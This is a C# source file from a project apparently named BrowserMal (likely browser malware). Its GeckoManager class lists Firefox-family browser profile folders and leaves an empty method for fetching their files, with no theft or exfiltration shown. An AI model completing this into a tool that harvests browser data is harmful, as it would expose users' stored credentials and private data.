using BrowserMal.Browser;
using BrowserMal.Model;
using System.Collections.Generic;
using System.IO;
using System.Linq;

namespace BrowserMal.Manager
{
    public class GeckoManager<T>
    {
        private readonly string tableName;
        private readonly SqliteTableModel sqliteTableModel;
        private readonly Dictionary<string, string> resultList;

        public GeckoManager(string tableName, SqliteTableModel sqliteTableModel)
        {
            this.tableName = tableName;
            this.sqliteTableModel = sqliteTableModel;
            resultList = new Dictionary<string, string>();
        }

        private List<string> GetAllProfiles(string root) => Directory.GetDirectories(root).ToList();

        public void Init(ref List<BrowserModel> browsers)
        {
            foreach (BrowserModel browser in browsers)
            {
                if (!Directory.Exists(browser.Location))
                    continue;

                List<string> profiles = GetAllProfiles(browser.Location);
                FetchFiles(profiles);
            }

        }

        private void FetchFiles(List<string> profiles)
        {
            foreach (string profile in profiles)
            {

            }
        }
    }
}
